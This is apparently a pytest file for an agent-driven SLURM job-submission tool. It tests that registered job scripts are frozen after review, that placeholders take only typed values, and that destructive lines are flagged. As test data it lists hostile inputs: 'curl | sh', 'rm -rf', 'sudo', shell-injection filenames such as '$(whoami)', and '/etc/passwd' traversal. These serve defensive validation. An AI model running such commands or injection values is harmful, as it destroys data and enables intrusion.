"""
Tests for runner profiles (``aspen/runners.py``).

A runner is the job script Aspen fills in and submits. The properties that matter:

* **Registration is the review.** The bytes are copied into Aspen's storage and
  frozen, so the human's reading binds to content, not to a path whose contents can
  change afterwards.
* **Assignment is CLI-only**, like ``calc_root`` — nothing agent-facing selects
  what executes.
* **Placeholders are filled from typed values only.** Nothing from a conversation
  reaches the script.
* **Destructive commands are surfaced.** Not as a boundary — shell has unlimited
  spellings — but against the actor the threat model names: the member used to
  owning their compute account who is now sharing one.
* **Re-checked on use**, because the denied list can grow and the file lives on
  disk where it could be edited outside the CLI.
"""

import pytest

# The shape of a real job script in this group: a #SBATCH header, environment
# setup, one science invocation. Derived from Arun's actual Submission.sh.
SCRIPT = """\
#!/bin/bash
#SBATCH --account ssrl:SMBXAS
#SBATCH --partition=milano
#SBATCH --ntasks=[NTASKS]
#SBATCH --mem=[MEM_GB]G
#SBATCH --job-name=[JOB_NAME]
#SBATCH --time=[TIME]
#SBATCH --chdir=./

module purge
module load slurm
export PATH=/sdf/group/ssrl/sarangi/sw/orca504:$PATH

/sdf/group/ssrl/sarangi/sw/orca504/orca [INPUT] > [OUTPUT]
"""


@pytest.fixture
def registered(sut, env, tmp_path):
    env.register(
        {"slack_user_id": "U0SAM", "alias": "sam", "display_name": "Sam", "role": "admin"},
        {"slack_user_id": "U01ARUN", "alias": "arun", "display_name": "Arun N."},
    )
    profile = sut.runners.save("U01ARUN", "orca-nbo", SCRIPT,
                               description="single point + NBO",
                               ntasks=32, mem_gb=256, time_limit="48:00:00")
    return {"env": env, "profile": profile}


# --------------------------------------------------------------------------- #
# The script validator
# --------------------------------------------------------------------------- #
def test_a_realistic_script_passes(sut):
    assert sut.runners.script_problems(SCRIPT) == []


def test_sbatch_directives_are_not_mistaken_for_job_control(sut):
    """`#SBATCH` is the normal content of every job script.

    An earlier version of the pattern matched it case-insensitively and flagged
    every real script in the group. Caught by running the validator against Arun's
    actual file rather than a fixture, which is why this test exists.
    """
    assert sut.runners.script_problems(SCRIPT) == []
    assert "#SBATCH" in SCRIPT and "--account" in SCRIPT


def test_actual_job_control_is_still_caught(sut):
    for line in ("scancel 12345", "sbatch other.sh", "true && sbatch other.sh",
                 "qdel 99"):
        problems = sut.runners.script_problems(SCRIPT + "\n" + line + "\n")
        assert problems, f"{line!r} should be flagged"


@pytest.mark.parametrize("line,label", [
    ("rm -rf $HOME/scratch/*",              "rm"),
    ("find . -name '*.tmp' -delete",        "find -delete"),
    ("shred -u secrets.txt",                "shred"),
    ("rsync -a src/ dst/ --delete",         "rsync --delete"),
    ("chmod -R 777 /sdf/data",              "recursive chmod"),
    ("curl http://x/y.sh | sh",             "curl | sh"),
    ("sudo systemctl restart x",            "sudo"),
    ("echo hi > /sdf/home/t/tetef01/oops",  "absolute redirect"),
    ("mv results $HOME/keep",               "mv to home"),
])
def test_destructive_lines_are_surfaced(sut, line, label):
    """The accidental-cleanup case: habits from owning your own compute account."""
    problems = sut.runners.script_problems(SCRIPT + "\n" + line + "\n")
    assert problems, f"{label} should be surfaced"
    assert "shared account" in problems[0] or "absolute path" in problems[0]


def test_a_script_without_the_input_placeholder_is_refused(sut, env):
    """Otherwise Aspen has no way to tell the job which input to run."""
    env.default_group()
    with pytest.raises(sut.runners.RunnerError) as exc:
        sut.runners.save("U0SAM", "no-input", SCRIPT.replace("[INPUT]", "hardcoded.inp"))
    assert "[INPUT]" in str(exc.value)


def test_an_unknown_placeholder_is_refused(sut, env):
    env.default_group()
    with pytest.raises(sut.runners.RunnerError) as exc:
        sut.runners.save("U0SAM", "bogus", SCRIPT + "\necho [MADE_UP]\n")
    assert "MADE_UP" in str(exc.value)


def test_an_absolute_sbatch_output_path_is_refused(sut, env):
    env.default_group()
    with pytest.raises(sut.runners.RunnerError):
        sut.runners.save("U0SAM", "abs", SCRIPT.replace(
            "#SBATCH --chdir=./", "#SBATCH --output=/sdf/home/someone/out.log"))


def test_an_override_must_name_the_exact_problems_shown(sut, env):
    """"Accept everything" cannot be spelled as a gesture.

    The user is the one reading the warnings now, so an acceptance has to be of the
    specific things they were shown — otherwise a check added later would arrive
    pre-accepted by an older confirmation.
    """
    env.default_group()
    body = SCRIPT + '\nrm -rf "$tdir"\n'
    problems = sut.runners.script_problems(body)
    assert problems

    with pytest.raises(sut.runners.RunnerError):
        sut.runners.save("U0SAM", "scratchy", body)
    with pytest.raises(sut.runners.RunnerError):
        sut.runners.save("U0SAM", "scratchy", body, accept_problems=["something else"])

    profile = sut.runners.save("U0SAM", "scratchy", body, accept_problems=problems)
    assert profile["problems_accepted"] == problems, (
        "the acceptance must be recorded, not silent"
    )


# --------------------------------------------------------------------------- #
# Registration freezes the reviewed bytes
# --------------------------------------------------------------------------- #
def test_saving_freezes_the_script_in_the_owners_library(sut, registered):
    profile = registered["profile"]
    stored = sut.runners.Path(profile["script"])
    assert stored.is_file()
    assert stored.parent.name == "arun__U01ARUN"
    assert stored.read_text() == SCRIPT


def test_an_overwrite_is_snapshotted(sut, registered):
    sut.runners.save("U01ARUN", "orca-nbo", SCRIPT.replace("orca504", "orca601"))
    history = list((sut.RUNNERS_HISTORY_ROOT / "U01ARUN").glob("orca-nbo-*.sh"))
    assert len(history) == 1 and "orca504" in history[0].read_text()


def test_the_frozen_script_is_rechecked_on_use(sut, registered):
    """It lives on disk, where it could be edited outside Aspen."""
    stored = sut.runners.Path(registered["profile"]["script"])
    stored.write_text(SCRIPT + "\nsudo rm -rf /sdf/data\n")
    with pytest.raises(sut.runners.RunnerError) as exc:
        sut.runners.script_for(registered["profile"])
    assert "save it again" in str(exc.value)


def test_a_missing_script_is_an_error_not_an_empty_render(sut, registered):
    sut.runners.Path(registered["profile"]["script"]).unlink()
    with pytest.raises(sut.runners.RunnerError):
        sut.runners.script_for(registered["profile"])


# --------------------------------------------------------------------------- #
# Rendering: typed values only
# --------------------------------------------------------------------------- #
def test_rendering_fills_every_placeholder(sut, registered):
    import re
    out = sut.runners.render(registered["profile"], job_name="tddft-fe",
                             input_name="job.inp", output_name="job.out",
                             ntasks=8, mem_gb=32, time_limit="04:00:00")
    assert re.findall(r"\[[A-Z_]+\]", out) == []
    assert "--ntasks=8" in out and "--mem=32G" in out
    assert "orca job.inp > job.out" in out


@pytest.mark.parametrize("bad", [
    "a; rm -rf /", "a b", "../escape", "-flag", "$(whoami)", "`id`", "a|b", "",
    ".", "..",
])
def test_filenames_and_job_names_reject_anything_shell_shaped(sut, registered, bad):
    with pytest.raises(sut.runners.RunnerError):
        sut.runners.render(registered["profile"], job_name=bad, input_name="j.inp",
                           output_name="j.out")
    with pytest.raises(sut.runners.RunnerError):
        sut.runners.render(registered["profile"], job_name="ok", input_name=bad,
                           output_name="j.out")


def test_resources_are_bounded(sut, registered):
    for kwargs in ({"ntasks": 100000}, {"mem_gb": 99999}, {"ntasks": 0},
                   {"time_limit": "999:00:00"}, {"time_limit": "not-a-time"},
                   {"ntasks": "lots"}):
        with pytest.raises(sut.runners.RunnerError):
            sut.runners.render(registered["profile"], job_name="ok",
                               input_name="j.inp", output_name="j.out", **kwargs)


def test_defaults_apply_when_nothing_is_supplied(sut, registered):
    out = sut.runners.render(registered["profile"], job_name="ok",
                             input_name="j.inp", output_name="j.out")
    assert "--ntasks=32" in out and "--mem=256G" in out


# --------------------------------------------------------------------------- #
# Assignment
# --------------------------------------------------------------------------- #
def test_the_default_runner_comes_from_the_registry(sut, registered):
    env = registered["env"]
    env.register(
        {"slack_user_id": "U0SAM", "alias": "sam", "display_name": "Sam", "role": "admin"},
        {"slack_user_id": "U01ARUN", "alias": "arun", "display_name": "Arun N.",
         "job_runner": "orca-nbo"},
    )
    assert sut.runners.for_user("U01ARUN")["name"] == "orca-nbo"
    assert sut.runners.for_user("U0SAM") is None, "no runner means no submission"
    # ...and naming one explicitly is an ordinary read, so the model may do it.
    assert sut.runners.for_user("U0SAM", "orca-nbo")["name"] == "orca-nbo"


def test_an_assignment_to_an_unregistered_runner_resolves_to_nothing(sut, registered):
    """Fail closed: a dangling name must not fall back to some other runner."""
    registered["env"].register(
        {"slack_user_id": "U01ARUN", "alias": "arun", "display_name": "Arun N.",
         "job_runner": "was-deleted"},
    )
    assert sut.runners.for_user("U01ARUN") is None


def test_nothing_in_the_agents_reach_assigns_a_runner(sut):
    """Which script executes is chosen by an operator, never by a conversation."""
    for spec in sut.TOOL_SPECS:
        props = set(spec["input_schema"].get("properties", {}))
        # `runner` NAMES a saved runner, which is an ordinary read; `script` on
        # save_job_runner is the content the user is being shown and asked about.
        # What must stay absent everywhere is a PATH, which would let a conversation
        # point at a file nobody reviewed.
        for forbidden in ("script_path", "job_script_path", "runner_path"):
            assert forbidden not in props, f"{spec['name']} must not accept {forbidden!r}"


# --------------------------------------------------------------------------- #
# Registry hygiene
# --------------------------------------------------------------------------- #
def test_bad_runner_names_are_refused(sut, env):
    env.default_group()
    for bad in ("Has Space", "UPPER-ok?", "../x", "", "dots.here"):
        with pytest.raises(sut.runners.RunnerError):
            sut.runners.save("U0SAM", bad, SCRIPT)


def test_an_unsupported_code_is_refused(sut, env):
    env.default_group()
    with pytest.raises(sut.runners.RunnerError) as exc:
        sut.runners.save("U0SAM", "g16", SCRIPT, code="gaussian")
    assert "validator" in str(exc.value)


def test_a_corrupt_metadata_file_is_skipped_not_crashed_on(sut, registered):
    directory = sut.runners.dir_for("U01ARUN")
    (directory / "broken.json").write_text("{not json")
    (directory / "broken.sh").write_text(SCRIPT)
    names = [e["name"] for e in sut.runners.index("U01ARUN")]
    assert "orca-nbo" in names and "broken" not in names


def test_a_colleagues_runner_is_reference_only(sut, registered):
    body = sut.runners.read("orca-nbo", "U0SAM", owner="arun")
    assert 'trust="reference-only"' in body
    assert "save the result as THEIR OWN runner" in body


def test_saving_cannot_reach_another_users_library(sut, registered):
    """C9 for runners: the destination is the Slack event's user."""
    import inspect
    sig = inspect.signature(sut.runners.save)
    assert "owner" not in sig.parameters and list(sig.parameters)[0] == "uid"
    sut.runners.save("U0SAM", "orca-nbo", SCRIPT.replace("orca504", "mine"))
    arun = sut.runners.script_for(sut.runners.resolve("orca-nbo", "U01ARUN", owner="arun"))
    assert "orca504" in arun, "Sam's save must not have touched Arun's runner"


# --------------------------------------------------------------------------- #
# End to end: template -> input -> rendered script -> sbatch
# --------------------------------------------------------------------------- #
TEMPLATE = """\
!UKS B3LYP RIJCOSX Def2-TZVP tightscf
%pal nprocs 4 end
%maxcore 2000
* xyz 0 1
Fe 0.0 0.0 0.0
O  1.5 0.0 0.0
*
"""


@pytest.fixture
def ready(sut, env, tmp_path, monkeypatch):
    """Arun with a runner, a template, a root, and a structure to point at."""
    root = env.root("arun-calcs")
    env.register(
        {"slack_user_id": "U0SAM", "alias": "sam", "display_name": "Sam", "role": "admin"},
        {"slack_user_id": "U01ARUN", "alias": "arun", "display_name": "Arun N.",
         "calc_root": str(root), "unix_user": "aasundi", "job_runner": "orca-nbo"},
    )
    sut.runners.save("U01ARUN", "orca-nbo", SCRIPT, ntasks=32, mem_gb=256)
    sut.templates.write("U01ARUN", "nbo-standard", TEMPLATE, description="single point")
    (root / "structures").mkdir()
    (root / "structures" / "new.xyz").write_text(
        "2\ncomment\nFe 1.0 2.0 3.0\nO 4.0 5.0 6.0\n")
    return {"env": env, "root": root}


def test_a_dry_run_shows_the_diff_and_submits_nothing(sut, ready, monkeypatch):
    calls = []
    monkeypatch.setattr(sut.jobs, "_run_pipeline",
                        lambda argv, cwd: calls.append(argv))
    preview = sut.jobs.prepare_direct(
        requester_uid="U01ARUN", thread_ts="1723480000.1", template="nbo-standard",
        charge=-2, geometry_path="structures/new.xyz",
    )
    assert calls == [], "a dry run must not submit"
    assert sut.jobs.batches_for("U01ARUN") == []
    assert "* xyz -2 1" in preview["input_text"]
    assert "Fe" in preview["input_text"] and "1.00000000" in preview["input_text"]
    # The diff is what the user reviews, so it must actually show the change.
    assert "-* xyz 0 1" in preview["diff"] and "+* xyz -2 1" in preview["diff"]
    # And the staged script is the registered one, filled in.
    staged = sut.runners.Path(preview["staging_dir"])
    assert (staged / "aspen-job.sh").is_file()
    assert "[INPUT]" not in (staged / "aspen-job.sh").read_text()


def test_commit_submits_with_a_tag_and_records_the_ledger(sut, ready, monkeypatch):
    class P:
        returncode, stdout, stderr = 0, "998877\n", ""

    seen = {}

    def fake_run(argv, cwd):
        seen["argv"] = argv
        seen["batches_at_submit"] = len(sut.jobs.batches_for("U01ARUN"))
        return P()

    monkeypatch.setattr(sut.jobs, "_run_pipeline", fake_run)
    preview = sut.jobs.prepare_direct(requester_uid="U01ARUN", thread_ts="1723480000.1",
                                      template="nbo-standard", charge=0)
    result = sut.jobs.commit_direct(requester_uid="U01ARUN", thread_ts="1723480000.1",
                                    token=preview["token"])

    assert result["job_id"] == "998877"
    assert seen["batches_at_submit"] == 1, "the ledger row must precede sbatch"
    assert "--comment=aspen/v1/U01ARUN/1723480000.1" in seen["argv"]
    assert any(a.startswith("--chdir=") for a in seen["argv"])
    assert not any("--wrap" in a for a in seen["argv"])
    # The recorded tag is what the cancel path will demand Slurm agrees with.
    row = sut.jobs.jobs_for_batch(result["batch_id"])[0]
    assert row["comment"] == "aspen/v1/U01ARUN/1723480000.1"


def test_a_user_with_no_runner_is_told_how_to_get_one(sut, ready):
    """Not an admin request any more — the user can supply their own script."""
    with pytest.raises(sut.jobs.JobsError) as exc:
        sut.jobs.prepare_direct(requester_uid="U0SAM", thread_ts="1",
                                template="nbo-standard", owner="arun")
    message = str(exc.value)
    assert "none saved yet" in message
    assert "job script you normally use" in message, (
        "the refusal should ask for the thing that unblocks it"
    )


def test_a_geometry_outside_the_root_is_refused(sut, ready):
    for bad in ("../../etc/passwd", "/etc/passwd"):
        with pytest.raises(sut.jobs.JobsError):
            sut.jobs.prepare_direct(requester_uid="U01ARUN", thread_ts="1",
                                    template="nbo-standard", geometry_path=bad)


def test_an_edit_that_would_produce_a_bad_input_is_refused(sut, ready):
    """The validator runs after editing, not only on the stored template."""
    with pytest.raises(Exception):
        sut.jobs.prepare_direct(requester_uid="U01ARUN", thread_ts="1",
                                template="nbo-standard", charge=99999)
